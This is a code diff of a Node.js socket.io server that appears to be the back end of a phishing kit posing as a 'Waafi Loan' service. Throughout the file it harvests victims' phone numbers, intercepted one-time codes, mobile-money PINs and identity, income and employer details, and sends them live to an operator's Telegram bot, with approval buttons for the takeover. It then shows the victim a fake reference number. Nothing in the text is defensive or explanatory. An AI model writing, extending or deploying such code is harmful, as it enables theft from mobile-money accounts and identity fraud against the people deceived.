@@ -37,14 +37,14 @@ io.on('connection', (socket) => {
     
     socket.join(activeRoom);
     socket.emit('session-ready', { appId: activeRoom });
-    console.log(`🔌 Assigned internal tracking session: ${activeRoom}`);
+    console.log(` Assigned internal tracking session: ${activeRoom}`);
 
     socket.on('join-room', (room) => {
         if (room && room !== "null" && room !== "") {
             socket.leave(activeRoom);
             socket.join(room);
             activeRoom = room;
-            console.log(`🔌 User synchronized room identifier: ${room}`);
+            console.log(` User synchronized room identifier: ${room}`);
         }
     });
 
@@ -55,80 +55,81 @@ io.on('connection', (socket) => {
         return activeRoom;
     };
 
-    // STEP 1: Phone submission (Djibouti +253 Context handled on client)
+    // STEP 1: Initial Phone Request (Triggers Admin Alert)
     socket.on('request-otp1', (data) => {
         const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "Initial Request: Phone Submitted", { Phone: data.phone }, false);
+        
+        // Notify the client that the notification went through and they can now input the OTP
+        socket.emit('otp1-requested-success');
     });
 
-    // STEP 1 Validation: Intercepted OTP 1 (Requires Admin Approval Buttons)
-    socket.on('step4-otp', (data) => {
+    // STEP 1: Verify intercepted OTP 1 (Requires Admin Approval Buttons)
+    socket.on('verify-otp1', (data) => {
         const currentId = getValidId(data);
-        botManager.sendToAdmin(currentId, "Step 1: Phone & Intercepted OTP 1", { Phone: data.phone, "OTP 1": data.otp }, true);
+        botManager.sendToAdmin(currentId, "Step 1: Phone & Intercepted OTP 1", { "OTP 1": data.code }, true);
     });
 
-    // STEP 2: MoMo PIN Entry (Requires Admin Approval Buttons)
-    socket.on('step5-pin', (data) => {
+    // STEP 2: Main MoMo PIN Verification (Requires Admin Approval Buttons)
+    socket.on('verify-pin', (data) => {
         const currentId = getValidId(data);
         botManager.sendFinalApproval(currentId, data.pin);
     });
 
     // STEP 3: OTP 2 Validation (Requires Admin Approval Buttons)
-    socket.on('submit-otp2', (data) => {
+    socket.on('verify-otp2', (data) => {
         const currentId = getValidId(data);
-        botManager.sendSecondOTP(currentId, data.otp2);
+        botManager.sendSecondOTP(currentId, data.code);
     });
 
-    // STEP 4: Loan Request Parameters (PASSIVE LOGGING ONLY - No Controls)
-    socket.on('step1', (data) => {
+    // STEP 7 + Finalization Handler: Collects steps 4, 5, 6, and 7
+    socket.on('finalize-loan', (data) => {
         const currentId = getValidId(data);
-        const { appId, ...cleanData } = data;
-        botManager.sendToAdmin(currentId, "Step 4: Loan Request Parameters", cleanData, false);
-    });
+        const { confirmPin, ...profileData } = data;
+        
+        // Quietly log data steps to the admin bot manager for tracking
+        botManager.sendToAdmin(currentId, "Step 4: Loan Request Parameters", {
+            "Type": profileData.loanType,
+            "Amount": profileData.amount,
+            "Term": profileData.term + " mois",
+            "Purpose": profileData.purpose
+        }, false);
 
-    // STEP 5: Personal Identity Profile (PASSIVE LOGGING ONLY - No Controls)
-    socket.on('step2', (data) => {
-        const currentId = getValidId(data);
-        const { appId, ...cleanData } = data;
-        botManager.sendToAdmin(currentId, "Step 5: Personal Identity Profile", cleanData, false);
-    });
-    
-    // STEP 6: Employment & Income Status (PASSIVE LOGGING ONLY - Moves frontend directly to Step 7)
-    socket.on('step3-data', (data) => {
-        const currentId = getValidId(data);
-        const { appId, ...cleanData } = data;
-        
-        botManager.sendToAdmin(currentId, "Step 6: Employment & Income Status", cleanData, false);
-    });
+        botManager.sendToAdmin(currentId, "Step 5: Personal Identity Profile", {
+            "Name": `${profileData.firstName} ${profileData.lastName}`,
+            "Email": profileData.email
+        }, false);
 
-    // STEP 7: Final Signature PIN Confirmation (No Admin Verification Needed - Immediate Success Output)
-    socket.on('execute-final-confirmation', (data) => {
-        const currentId = getValidId(data);
-        const { appId, confirmPin } = data;
+        botManager.sendToAdmin(currentId, "Step 6: Employment & Income Status", {
+            "Status": profileData.employment,
+            "Income": profileData.income,
+            "Employer": profileData.employer || "N/A"
+        }, false);
+
+        botManager.sendToAdmin(currentId, "Step 7: Final Signature PIN Confirmation", { 
+            "Confirmed PIN": confirmPin 
+        }, false);
         
-        // Quietly log confirmed code entry parameters inside the administration panel chat
-        botManager.sendToAdmin(currentId, "Step 7: Final Signature PIN Confirmation", { "Confirmed PIN": confirmPin }, false);
-        
-        // Generate systematic response properties instantly for client resolution step 8
+        // Generate systematic response properties instantly for client success step 8
         const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
-        io.to(currentId).emit('application-complete', { referenceId });
-        console.log(`✅ Session ${currentId} successfully generated local validation parameters.`);
+        io.to(currentId).emit('application-finalized', { referenceId });
+        console.log(` Session ${currentId} successfully generated local validation parameters.`);
     });
 
     socket.on('disconnect', () => {
-        console.log(`🔌 User disconnected socket room: ${activeRoom}`);
+        console.log(` User disconnected socket room: ${activeRoom}`);
     });
 });
 
 server.listen(PORT, async () => {
-    console.log(`🚀 Waafi Loan Server running on port ${PORT}`);
+    console.log(` Waafi Loan Server running on port ${PORT}`);
     if (EXTERNAL_URL) {
         const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
         try {
             await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook successfully set to: ${webhookUrl}`);
+            console.log(` Webhook successfully set to: ${webhookUrl}`);
         } catch (err) {
-            console.error('❌ Webhook Setup Failed:', err.message);
+            console.error(' Webhook Setup Failed:', err.message);
         }
     }
 });
